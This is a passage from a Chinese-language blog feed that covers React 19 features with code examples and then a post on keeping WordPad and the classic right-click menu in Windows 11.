自動處理懸掛（suspense）機制，直到資源準備好為止，這樣就可以簡化資料的處理流程，不必手動管理載入狀態。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; use &#125; <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Comments</span>(<span class="params">&#123; commentsPromise &#125;</span>) &#123;</span><br><span class="line">  <span class="comment">// `use` 會在 promise 解決之前進行 suspend</span></span><br><span class="line">  <span class="keyword">const</span> comments = <span class="title function_">use</span>(commentsPromise);</span><br><span class="line">  <span class="keyword">return</span> comments.<span class="title function_">map</span>(<span class="function">(<span class="params">comment</span>) =&gt;</span> <span class="language-xml"><span class="tag">&lt;<span class="name">p</span> <span class="attr">key</span>=<span class="string">&#123;comment.id&#125;</span>&gt;</span>&#123;comment&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Page</span>(<span class="params">&#123; commentsPromise &#125;</span>) &#123;</span><br><span class="line">  <span class="comment">// 當 `use` 在 Comments 中 suspend 時，</span></span><br><span class="line">  <span class="comment">// 這個 Suspense 邊界會顯示</span></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Suspense</span> <span class="attr">fallback</span>=<span class="string">&#123;</span>&lt;<span class="attr">div</span>&gt;</span>Loading...<span class="tag">&lt;/<span class="name">div</span>&gt;</span>&#125;&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Comments</span> <span class="attr">commentsPromise</span>=<span class="string">&#123;commentsPromise&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Suspense</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="簡化-ref-使用"><a href="#簡化-ref-使用" class="headerlink" title="簡化 ref 使用"></a>簡化 ref 使用</h2><p>React 19 改善了對 ref 的使用，支援將 ref 作為 props 傳遞給函式元件，並增加了對 ref 清理函式的支援。這使得管理元件的 ref 更加簡單且直觀，不再需要使用 forwardRef。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MyInput</span>(<span class="params">&#123; placeholder, ref &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">input</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">placeholder</span>=<span class="string">&#123;placeholder&#125;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">      <span class="attr">ref</span>=<span class="string">&#123;(ref)</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-xml">        // ref 被創建</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">        // 新增：返回一個清理函式，當元素從 DOM 中移除時重置 ref</span></span><br><span class="line"><span class="language-xml">        return () =&gt; &#123;</span></span><br><span class="line"><span class="language-xml">          // ref 清理邏輯</span></span><br><span class="line"><span class="language-xml">        &#125;;</span></span><br><span class="line"><span class="language-xml">      &#125;&#125;</span></span><br><span class="line"><span class="language-xml">    /&gt;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用時：</span></span><br><span class="line">&lt;<span class="title class_">MyInput</span> ref=&#123;ref&#125; /&gt;;</span><br></pre></td></tr></table></figure><h2 id="useDeferredValue：延遲更新優化性能"><a href="#useDeferredValue：延遲更新優化性能" class="headerlink" title="useDeferredValue：延遲更新優化性能"></a>useDeferredValue：延遲更新優化性能</h2><p>React 19 引入了 useDeferredValue，它允許在初始渲染時使用預設值，並將數據更新推遲至背景中進行，這樣就能有效減少數據變更對渲染性能的影響。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Search</span>(<span class="params">&#123; deferredValue &#125;</span>) &#123;</span><br><span class="line">  <span class="comment">// 初次渲染時，value 是空字串 (&#x27;&#x27;)。</span></span><br><span class="line">  <span class="comment">// 隨後會安排在背景中使用 deferredValue 重新渲染。</span></span><br><span class="line">  <span class="keyword">const</span> value = <span class="title function_">useDeferredValue</span>(deferredValue, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">Results</span> <span class="attr">query</span>=<span class="string">&#123;value&#125;</span> /&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="React-19-提升樣式和資源載入效能"><a href="#React-19-提升樣式和資源載入效能" class="headerlink" title="React 19 提升樣式和資源載入效能"></a>React 19 提升樣式和資源載入效能</h2><p>React 19 針對樣式表和資源載入進行了優化，支援在客戶端渲染和伺服器端渲染中更好地整合和載入資源，從而提升應用的載入速度和流暢度。</p><p>開發者可以更加靈活地控制樣式表的載入順序，保證依賴樣式表的內容在樣式表載入後才會渲染，避免因樣式表未載入完全而導致的渲染問題。</p><h2 id="內建支援使用-Meta-Data"><a href="#內建支援使用-Meta-Data" class="headerlink" title="內建支援使用 Meta Data"></a>內建支援使用 Meta Data</h2><p>在 React 19 中 對 Meta Data 提供了原生支援，實現了在元件中渲染文檔標籤（如 <code>&lt;title&gt;</code>、<code>&lt;link&gt;</code> 和 <code>&lt;meta&gt;</code>），並將它們自動提升到文檔的 <code>&lt;head&gt;</code> 區域。</p><p>這確保了這些元資料標籤在客戶端應用、流式 SSR 和伺服器端元件中的正常運作，從而提升了性能，雖然 React 提供了內建支援，對於更複雜的場景，您仍然可以選擇使用第三方庫來處理元資料，例如 react-helmet，它可以根據當前路由動態更新元資料。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">BlogPost</span>(<span class="params">&#123; post &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">article</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;post.title&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;post.title&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;author&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Josh&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;author&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://twitter.com/joshcstory/&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;keywords&quot;</span> <span class="attr">content</span>=<span class="string">&#123;post.keywords&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>Eee equals em-see-squared...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="優化樣式表載入"><a href="#優化樣式表載入" class="headerlink" title="優化樣式表載入"></a>優化樣式表載入</h2><p>React 19 引入了樣式表的內建支援，進一步提升了客戶端和伺服器端渲染的性能。</p><p>在渲染包含樣式表的元件時，React 會根據設置的優先順序自動管理樣式表在 DOM 中的插入順序，確保樣式表先於內容渲染。</p><ul><li>伺服器端渲染：React 會確保樣式表在流式渲染過程中提前載入，避免阻塞頁面渲染。</li><li>客戶端渲染：React 確保樣式表載入完成後再進行渲染，並且多次渲染同一元件時，樣式表只會被載入一次。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ComponentOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">Suspense</span> <span class="attr">fallback</span>=<span class="string">&quot;loading...&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;foo&quot;</span> <span class="attr">precedence</span>=<span class="string">&quot;default&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;bar&quot;</span> <span class="attr">precedence</span>=<span class="string">&quot;high&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">article</span> <span class="attr">className</span>=<span class="string">&quot;foo-class bar-class&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;...&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">Suspense</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ComponentTwo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;...&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;baz&quot;</span> <span class="attr">precedence</span>=<span class="string">&quot;default&quot;</span> /&gt;</span>  &#123;/* 將會被插入在 foo 和 bar 之間 */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentOne</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      ...</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">ComponentOne</span> /&gt;</span> &#123;/* 不會在 DOM 中導致樣式表鏈接重複 */&#125;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="支援非同步腳本"><a href="#支援非同步腳本" class="headerlink" title="支援非同步腳本"></a>支援非同步腳本</h2><p>React 19 在非同步腳本的載入管理上提供了更高效的支援。無論腳本位於元件樹的何處，React 都能確保非同步腳本只會載入一次，從而提升性能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">MyComponent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>=<span class="string">&#123;true&#125;</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span> /&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">      Hello World</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">      <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">MyComponent</span> /&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        ...</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">        <span class="tag">&lt;<span class="name">MyComponent</span> /&gt;</span> &#123;/* 不會導致 DOM 中的腳本重複 */&#125;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">      <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="資源預載入支援"><a href="#資源預載入支援" class="headerlink" title="資源預載入支援"></a>資源預載入支援</h2><p>React 19 引入了資源預載入 API，可以讓瀏覽器更早地載入必要的資源，顯著提高頁面性能。這些 API 能夠幫助優化頁面載入速度，並讓資源更快地準備好以應對用戶交互。</p><ul><li>預載入字體、樣式表等資源：可以在頁面載入之前提前載入字體和樣式表，從而減少頁面顯示的延遲。</li><li>預先載入導航所需資源：當用戶進行點擊或懸停操作時，預載入未來導航可能需要的資源，加速頁面更新。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; prefetchDNS, preconnect, preload, preinit &#125; <span class="keyword">from</span> <span class="string">&quot;react-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">MyComponent</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">preinit</span>(<span class="string">&quot;https://.../path/to/some/script.js&quot;</span>, &#123; <span class="attr">as</span>: <span class="string">&quot;script&quot;</span> &#125;); <span class="comment">// 預先載入並執行此腳本</span></span><br><span class="line">  <span class="title function_">preload</span>(<span class="string">&quot;https://.../path/to/font.woff&quot;</span>, &#123; <span class="attr">as</span>: <span class="string">&quot;font&quot;</span> &#125;); <span class="comment">// 預載入此字體</span></span><br><span class="line">  <span class="title function_">preload</span>(<span class="string">&quot;https://.../path/to/stylesheet.css&quot;</span>, &#123; <span class="attr">as</span>: <span class="string">&quot;style&quot;</span> &#125;); <span class="comment">// 預載入此樣式表</span></span><br><span class="line">  <span class="title function_">prefetchDNS</span>(<span class="string">&quot;https://...&quot;</span>); <span class="comment">// 當你可能不會從此主機請求任何內容時使用</span></span><br><span class="line">  <span class="title function_">preconnect</span>(<span class="string">&quot;https://...&quot;</span>); <span class="comment">// 當你將會請求某些東西，但不確定具體請求的資源時使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 根據資源對早期載入的實用性優先排序，而非調用順序 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch-dns&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://...&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preconnect&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://...&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preload&quot;</span> <span class="attr">as</span>=<span class="string">&quot;font&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://.../path/to/font.woff&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;preload&quot;</span> <span class="attr">as</span>=<span class="string">&quot;style&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://.../path/to/stylesheet.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>=<span class="string">&quot;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://.../path/to/some/script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="React-19-完整支援-web-component"><a href="#React-19-完整支援-web-component" class="headerlink" title="React 19 完整支援 web component"></a>React 19 完整支援 web component</h2><p>React 19 完全支援 Web Components，並解決了以前版本中使用 Web Components 的一些相容性問題。現在，React 能夠正確處理傳遞給自訂元素的屬性，無論是在伺服器端渲染還是客戶端渲染中，都能夠精確區分和處理屬性與自訂元素的實際屬性，這使得 React 更加靈活和強大。</p><ul><li>伺服器端渲染（SSR）：當傳遞給自訂元素的 props 是基礎類型（例如字串、數字或值為 true）時，會作為屬性渲染。如果 props 是非基礎類型（例如物件、符號、函式或值為 false），則會被省略。</li><li>客戶端渲染（CSR）：當 props 與自訂元素實例的屬性相符時，將被作為屬性分配給該元素，否則會作為屬性分配。這樣的設計讓 React 更加靈活地支援自訂元素，解決了先前的相容性問題，無論是在伺服器端還是客戶端渲染中，處理方式都能有效區分屬性和自訂元素的實際屬性。</li></ul><p><a href="https://custom-elements-everywhere.com/">https://custom-elements-everywhere.com/</a></p><h2 id="React-19-華麗登場，你準備好了嗎"><a href="#React-19-華麗登場，你準備好了嗎" class="headerlink" title="React 19 華麗登場，你準備好了嗎"></a>React 19 華麗登場，你準備好了嗎</h2><p>React 19 引入的這些新特性不僅提升了開發者的工作效率，還大幅改善了應用的性能和用戶體驗。</p><p>從簡化非同步狀態管理的 useActionState 到提升響應速度的 useOptimistic，再到優化資源載入和對 Web Components 的支援，顯著提高了頁面的載入性能和流暢度。無論是伺服器端渲染還是客戶端渲染，這些改進都能幫助開發者構建更加高效的應用。</p><p>如果你是一名 React 開發者，這些新特性無疑會讓你的開發過程更加順利，並能構建出更高效、流暢的應用。</p>]]></content>
      
      
      <categories>
          
          <category> React.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 網站技術 </tag>
            
            <tag> React.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 11 如何保留舊版應用程式與介面設定</title>
      <link href="/2024/12/08/windows11/how-to-retain-old-app-versions-or-interface-settings-in-windows-11/"/>
      <url>/2024/12/08/windows11/how-to-retain-old-app-versions-or-interface-settings-in-windows-11/</url>
      
        <content type="html"><![CDATA[<p>當你升級到 Windows 11 時，許多使用者習慣的舊版應用程式與介面設定可能會被改變，帶來不小的衝擊。</p><p>例如，經典的 WordPad 即將在 Windows 11 中消失，熟悉的開始選單也因為全新的設計而大幅改變，從左下角移動到中間，這些改動可能會讓長期使用者感到不便。</p><p>對於依賴舊版介面和應用程式的使用者來說，如何保留原本的操作體驗，成為升級過程中一個重要的問題。</p><p>本文將探討如何在 Windows 11 中保留舊版應用程式與介面設定，讓你可以在新系統中繼續保持熟悉的操作流程。</p><h2 id="再見-WordPad"><a href="#再見-WordPad" class="headerlink" title="再見 WordPad"></a>再見 WordPad</h2><p>在畢業離開學校後，由於沒有校園授權版本的 Office 繼續使用，畢業加購的 Office 2010 年的光碟也顯得有些過時，每次重灌或升級系統時 WordPad 仍然是開啟特殊檔案格式的好幫手。</p><h3 id="WordPad-的歷史背景"><a href="#WordPad-的歷史背景" class="headerlink" title="WordPad 的歷史背景"></a>WordPad 的歷史背景</h3><p>WordPad 在 1995 年隨 Windows 95 正式推出，取代了 Windows 3.1 及更早版本的小作家，成為大家常用的文字編輯工具。</p><p>儘管隨著 Microsoft Office 的普及，WordPad 的使用率逐漸降低，但許多使用者仍然認為它是處理 RTF 文件的最佳選擇。</p><h3 id="WordPad-的退出與影響"><a href="#WordPad-的退出與影響" class="headerlink" title="WordPad 的退出與影響"></a>WordPad 的退出與影響</h3><p>最近，微軟在 Windows 11 的 24H2 更新中，做出了引人注目的改變，經典的 WordPad 即將被移除。</p><p>這個決定令許多老用戶感到惋惜，因為他們依賴這個簡單而實用的工具來完成日常的文字編輯。</p><p>微軟建議使用者可以轉向使用 Word 或記事本，這一變化引發了不少討論。</p><h3 id="如何備份-WordPad"><a href="#如何備份-WordPad" class="headerlink" title="如何備份 WordPad"></a>如何備份 WordPad</h3><p>儘管 WordPad 被移除，其執行檔仍然存在於系統中。</p><p>如果你希望保留這個經典工具，可以按照以下步驟進行備份：</p><ol><li>打開檔案總管。</li><li>前往 C:\Program Files\Windows NT\Accessories。</li><li>複製 WordPad 的執行檔，並將其備份到你希望的位置。</li></ol><p><img src="https://ithelp.ithome.com.tw/upload/images/20241011/20130026urDzF2NEgh.png" alt="https://ithelp.ithome.com.tw/upload/images/20241011/20130026urDzF2NEgh.png"></p><p>這樣，即使未來無法直接使用 WordPad，你仍可以隨時找到和使用它。</p><p>隨著科技的不斷進步，也許會逐漸告別一些經典的工具，然而，WordPad 在許多使用者心中的位置依然不可取代。</p><p>無論未來如何，希望大家都能找到適合自己的文字編輯解決方案。</p><h2 id="右鍵選單去哪裡了？變回你原來的樣子吧！"><a href="#右鍵選單去哪裡了？變回你原來的樣子吧！" class="headerlink" title="右鍵選單去哪裡了？變回你原來的樣子吧！"></a>右鍵選單去哪裡了？變回你原來的樣子吧！</h2><p>Windows 11 這次更新看起來是把 UI&#x2F;UX team 全部換掉了?! 更新後右鍵選單大變樣！你準備好了嗎？</p><p>隨著 Windows 11 的推出，許多長期使用 Windows 系統的用戶發現，原本熟悉的右鍵選單發生了顯著的變化，這不僅是視覺上的改變，更在使用習慣上帶來了一定的挑戰。</p><p>接下來將討論 Windows 11 右鍵選單的設計變動，使用者如何適應這些變化，並對未來的改進提出建議。</p><h3 id="設計理念的變化"><a href="#設計理念的變化" class="headerlink" title="設計理念的變化"></a>設計理念的變化</h3><p>Windows 11 的更新顯然在視覺設計上更為現代化，並且強調簡潔與美學。</p><p>然而，這種設計的推動卻讓一些長期使用者感到困惑，尤其是習慣了 Windows 10 或更早版本的右鍵選單。</p><p>雖然新介面整體看起來更具現代感，功能卻變得不那麼直觀，許多常用的選項變得隱藏，甚至需要額外操作才能找到。</p><p>整個設計變漂亮很多，但是我就問我習慣的右鍵選單要去哪裏找?</p><h3 id="右鍵選單的「簡化」與隱藏選項"><a href="#右鍵選單的「簡化」與隱藏選項" class="headerlink" title="右鍵選單的「簡化」與隱藏選項"></a>右鍵選單的「簡化」與隱藏選項</h3><p>在 Windows 11 中，右鍵選單的結構被簡化，將常見操作（如複製、貼上、新建資料夾等）集中在主選單中，而將其他不那麼常用的選項隱藏在「顯示其他選項」的次級選單中。</p><p>這樣的設計雖然提升了視覺清爽度，但對於習慣老版選單的用戶來說，卻帶來了不小的挑戰。</p><p>雖然 Windows 11 仍然提供了「顯示其他選項」的功能，讓用戶可以找到傳統的右鍵選單，但這樣的設計卻讓人感到不夠直觀。</p><p>對於不熟悉新界面的用戶來說，這可能會成為一個障礙，甚至影響到工作效率。</p><h3 id="使用者的適應過程"><a href="#使用者的適應過程" class="headerlink" title="使用者的適應過程"></a>使用者的適應過程</h3><p>習慣了舊版介面的用戶需要時間去適應這一變化。對於這些用戶來說，操作流程的改變可能會影響工作效率，尤其是右鍵選單中隱藏的一些進階功能。</p><p>Windows 11 提供了多種方法來顯示完整的選單，包括：</p><ul><li>「顯示其他選項」：點擊右鍵後，選擇「顯示其他選項」，以顯示傳統的右鍵選單。</li><li>按住 Shift 鍵 + 右鍵點擊：這樣可以顯示更多高級選項。</li><li>強制改回舊版的選單，網路上有許多教學是通過 CMD 修改註冊表強制恢復，但不建議使用。</li></ul><p><img src="https://ithelp.ithome.com.tw/upload/images/20240928/20130026gXopprXQFO.png" alt="https://ithelp.ithome.com.tw/upload/images/20240928/20130026gXopprXQFO.png"></p><h3 id="微軟的妥協與未來的設計方向"><a href="#微軟的妥協與未來的設計方向" class="headerlink" title="微軟的妥協與未來的設計方向"></a>微軟的妥協與未來的設計方向</h3><p>微軟理解到這樣的變動對長期用戶可能帶來的不便，因此也提供了一些選項，讓用戶可以切換回舊版的右鍵選單。</p><p>這樣的設計反映了微軟對使用者需求的重視，然而這樣的「妥協」是否足夠，仍然值得探討。</p><p>若是微軟希望推廣新介面，應該更積極在界面中加入提示，讓用戶可以根據自己的需求選擇是否切換到新介面，這樣的做法能夠減少不必要的使用者困惑，並讓過渡期更為順暢。</p><h3 id="如何提升-Windows-11-右鍵選單體驗？"><a href="#如何提升-Windows-11-右鍵選單體驗？" class="headerlink" title="如何提升 Windows 11 右鍵選單體驗？"></a>如何提升 Windows 11 右鍵選單體驗？</h3><p>對於那些在日常工作中依賴右鍵選單進行多任務處理的用戶來說，如何快速適應 Windows 11 的更新至關重要。</p><ol><li>設置常用選項：使用者可以自定義 Windows 11 右鍵選單，將最常使用的功能放在更顯眼的位置，從而提升操作效率。這樣不僅能提高個人工作效率，也能減少多次點擊的時間浪費。</li><li>學習快捷鍵：Windows 11 提供了多種快捷鍵選項，能幫助用戶快速切換選單或執行操作。例如，「Shift + 右鍵」可以顯示完整選單，這樣的快捷操作將大大提升操作速度。</li><li>使用「顯示其他選項」的提示：為了幫助習慣舊版介面的用戶，微軟應考慮在新介面中添加更多的提示，告訴用戶如何調出完整選單。這不僅能提升使用者體驗，也能幫助新用戶更快上手。</li><li>保持界面一致性：儘管視覺上的更新是 Windows 11 